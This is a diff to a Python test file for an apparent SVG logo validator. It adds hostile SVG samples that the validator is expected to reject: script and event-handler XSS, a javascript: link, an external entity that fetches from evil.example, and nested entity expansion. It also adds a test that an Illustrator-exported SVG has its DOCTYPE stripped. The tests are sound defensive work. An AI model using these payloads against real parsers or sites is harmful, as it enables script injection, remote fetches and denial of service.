@@ -45,11 +45,29 @@ def test_size_limits():
 @pytest.mark.parametrize("evil", [
     b'<svg><script>alert(1)</script></svg>', b'<svg onload="alert(1)"></svg>',
     b'<svg><a href="javascript:alert(1)"><rect/></a></svg>', b'<svg><foreignObject><div/></foreignObject></svg>',
-    b'<svg><image href="https://evil.example/x.png"/></svg>', b'<!DOCTYPE svg [<!ENTITY x "y">]><svg></svg>',
+    b'<svg><image href="https://evil.example/x.png"/></svg>', b'<!DOCTYPE svg [<!ENTITY % p SYSTEM "https://evil.example/x">%p;]><svg></svg>',
+    b'<!DOCTYPE svg [<!ENTITY a "x"><!ENTITY b "&a;&a;">]><svg>&b;</svg>', b'<svg>&desconhecida;</svg>',
 ])
 def test_dangerous_svg_rejected(evil):
     with pytest.raises(branding.BrandingError, match="SVG"):
         branding.validate("logo", evil)
+
+
+ILLUSTRATOR = b"""<?xml version="1.0" encoding="utf-8"?>
+<!-- Generator: Adobe Illustrator 27.0.0, SVG Export Plug-In  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+	<!ENTITY ns_extend "http://ns.adobe.com/Extensibility/1.0/">
+	<!ENTITY ns_svg "http://www.w3.org/2000/svg">
+]>
+<svg version="1.1" xmlns="&ns_svg;" xmlns:x="&ns_extend;" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>"""
+
+
+def test_illustrator_svg_is_cleaned():
+    fmt, out = branding.prepare("logo", ILLUSTRATOR)
+    assert fmt == "svg" and b"DOCTYPE" not in out and b"&ns_svg;" not in out
+    assert b'xmlns="http://www.w3.org/2000/svg"' in out
+    plain = b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">' + SVG[22:]
+    assert branding.prepare("logo", plain)[1].lstrip().startswith(b"<svg")
 
 
 class FakeConn:
